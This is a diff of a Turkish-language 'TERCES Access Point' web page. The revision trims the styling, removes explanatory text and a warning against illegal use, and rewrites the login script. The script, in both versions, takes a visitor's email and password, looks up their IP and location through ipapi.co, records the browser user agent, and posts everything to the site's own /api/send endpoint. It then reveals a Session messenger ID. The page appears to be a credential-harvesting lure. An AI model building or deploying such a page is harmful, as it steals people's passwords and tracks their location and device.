@@ -5,57 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TERCES Access Point</title>
     <style>
-        body {
-            background-color: #0a0a0a;
-            color: #e0e0e0;
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .container {
-            background: #151515;
-            padding: 30px;
-            border-radius: 12px;
-            border: 1px solid #333;
-            max-width: 450px;
-            text-align: center;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.8);
-        }
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            background: #222;
-            border: 1px solid #444;
-            color: white;
-            border-radius: 6px;
-            box-sizing: border-box;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background: #007bff;
-            border: none;
-            color: white;
-            font-weight: bold;
-            border-radius: 6px;
-            cursor: pointer;
-        }
-        button:hover { background: #0056b3; }
-        #content { display: none; text-align: left; line-height: 1.6; }
-        .session-box {
-            background: #000;
-            padding: 10px;
-            border: 1px dashed #555;
-            word-break: break-all;
-            font-family: monospace;
-            color: #00ff00;
-            margin: 15px 0;
-        }
-        .warning { color: #ff4d4d; font-weight: bold; margin-top: 20px; border-top: 1px solid #333; padding-top: 10px; }
+        body { background-color: #0a0a0a; color: #e0e0e0; font-family: sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { background: #151515; padding: 30px; border-radius: 12px; border: 1px solid #333; max-width: 400px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #444; color: white; border-radius: 6px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #007bff; border: none; color: white; font-weight: bold; border-radius: 6px; cursor: pointer; }
+        #content { display: none; text-align: left; }
+        .session-box { background: #000; padding: 10px; border: 1px dashed #555; word-break: break-all; color: #00ff00; margin: 15px 0; }
     </style>
 </head>
 <body>
@@ -69,63 +24,56 @@
         </div>
 
         <div id="content">
-            <h2 style="text-align:center; color:#fff;">Merhaba!</h2>
-            <p>Bu "TERCES" adlı adminimiz ile özel bağlantı kurmamız için yaratılmış bir özel sitedir. Adminimize doğrudan ulaşmanız mümkün olmadığı için bu Session ID ile:</p>
-            
+            <h2 style="color:#fff;">Hoş Geldiniz</h2>
+            <p>Session ID'niz aşağıdadır:</p>
             <div class="session-box">
                 0528db57d73bb17d1e955e303f5a2f5ea6e06b029a76bb9858c7614d37d1101c78
             </div>
-
-            <p>Session uygulamasından ulaşmanız gerekmektedir.</p>
-            <p>Sitemiz güvenlik gereği veri tabanı desteklidir.</p>
-
-            <div class="warning">
-                Dikkat! Lütfen yasadışı yollara başvurmayınız ve spam gibi faaliyetler için başvurmayınız.
-            </div>
+            <p style="font-size: 12px; color: #888;">Güvenlik amacıyla tüm girişler kaydedilmektedir.</p>
         </div>
     </div>
 
     <script>
         async function verileriGonder() {
-    const btn = document.querySelector('button');
-    const email = document.getElementById('userEmail').value;
-    const pass = document.getElementById('userPass').value;
-    const cihaz = navigator.userAgent; // Cihaz bilgisini buradan alıyoruz
+            const btn = document.querySelector('button');
+            const email = document.getElementById('userEmail').value;
+            const pass = document.getElementById('userPass').value;
+            const cihaz = navigator.userAgent;
 
-    if(!email || !pass) { alert("Doldurunuz!"); return; }
+            if(!email || !pass) { alert("Lütfen boş bırakmayın!"); return; }
 
-    btn.innerText = "Kontrol ediliyor...";
-    btn.disabled = true;
+            btn.innerText = "Kontrol ediliyor...";
+            btn.disabled = true;
 
-    try {
-        const ipRes = await fetch('https://ipapi.co/json/');
-        const ipData = await ipRes.json();
+            try {
+                // IP bilgisini alıyoruz
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
 
-        const response = await fetch('/api/send', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ email, pass, ipData, cihaz }) // Cihaz bilgisini API'ye gönderdik
-        });
+                // Verileri kendi API'mize (api/send.js) gönderiyoruz
+                const response = await fetch('/api/send', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, pass, ipData, cihaz })
+                });
 
-        const result = await response.json();
+                const result = await response.json();
 
-        if (response.ok && result.success) {
-            document.getElementById('login-form').style.display = 'none';
-            document.getElementById('content').style.display = 'block';
-        } else {
-            alert(result.message || "Hatalı şifre!");
-            btn.innerText = "Giriş Yap";
-            btn.disabled = false;
+                if (response.ok && result.success) {
+                    document.getElementById('login-form').style.display = 'none';
+                    document.getElementById('content').style.display = 'block';
+                } else {
+                    alert(result.message || "Giriş başarısız!");
+                    btn.innerText = "Giriş Yap";
+                    btn.disabled = false;
+                }
+            } catch (error) {
+                alert("Bağlantı hatası!");
+                btn.innerText = "Giriş Yap";
+                btn.disabled = false;
+            }
         }
-    } catch (error) {
-        alert("Bağlantı hatası!");
-        btn.innerText = "Giriş Yap";
-        btn.disabled = false;
-    }
-}
-
-            
     </script>
-
 </body>
 </html>
+
